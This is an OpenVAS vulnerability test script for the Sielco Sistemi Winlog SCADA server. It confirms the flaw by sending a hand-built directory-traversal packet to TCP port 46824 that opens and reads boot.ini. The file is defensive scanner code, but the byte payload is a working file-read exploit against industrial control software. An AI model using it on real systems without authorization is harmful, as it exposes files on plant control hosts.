###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sielco_sistemi_winlog_mult_vuln.nasl 7549 2017-10-24 12:10:14Z cfischer $
#
# Sielco Sistemi Winlog Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802879");
  script_version("$Revision: 7549 $");
  script_cve_id("CVE-2012-4353", "CVE-2012-4354", "CVE-2012-4355", "CVE-2012-4356",
                "CVE-2012-4357", "CVE-2012-4358", "CVE-2012-4359");
  script_bugtraq_id(54212);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-10-24 14:10:14 +0200 (Tue, 24 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-06-28 12:12:09 +0530 (Thu, 28 Jun 2012)");
  script_name("Sielco Sistemi Winlog Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(46824);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://secunia.com/advisories/49395");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19409");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/winlog_2-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-179-01.pdf");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2012/06/sielco-sistemi-winlog-20716-multiple.html");

  tag_impact = "Successful exploitation will allow attacker to obtain sensitive
  information cause buffer overflow condition or execute arbitrary code under
  the context of the user.

  Impact Level: System/Application";

  tag_affected = "Sielco Sistemi Winlog version 2.07.16 and prior";

  tag_insight ="- Multiple errors in RunTime.exe and TCPIPS_Story.dll when
  processing a specially crafted packet sent to TCP port 46824.
  - An input validation error when processing certain user supplied inputs
  allows attackers to write arbitrary files via directory traversal attacks.";

  tag_solution = "Upgrade to version 2.07.17 or higher,
  For updates refer to http://www.sielcosistemi.com/en/products/winlog_scada_hmi";

  tag_summary = "This host is running Sielco Sistemi Winlog and is prone to
  multiple vulnerabilities.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");

## Variable Initialization
res  = "";
payload = "";
readData = "";
soc  = 0;
port = 0;

## Default Realwin Port
port = 46824;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Send payload with opcode 0x78 (to open file) followed by ../../boot.ini
payload = raw_string(crap(data:raw_string(0x00), length: 20),
                     0x78, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                     0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e,
                     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e,
                     0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                     0x2e, 0x2e, 0x2f, 0x62, 0x6f, 0x6f, 0x74,
                     0x2e, 0x69, 0x6e, 0x69, 0x00, 0x00, 0x00,
                     0x00, 0x00);

send(socket:soc, data: payload);
res = recv(socket:soc, length:200);

## Check if the response starts with 0x78
if (!res || !(hexstr(res) =~ "^78"))
{
  close(soc);
  exit(0);
}

## Send the data by sending opcode 0x98 ( to read file content)
readData = raw_string(crap(data:raw_string(0x00), length: 20), 0x98,
                      crap(data:raw_string(0x00), length: 10));

send(socket:soc, data: readData);
res = recv(socket:soc, length:200);
close(soc);

if (res && "[boot loader]" >< res  && "WINDOWS" >< res){
  security_message(port);
}
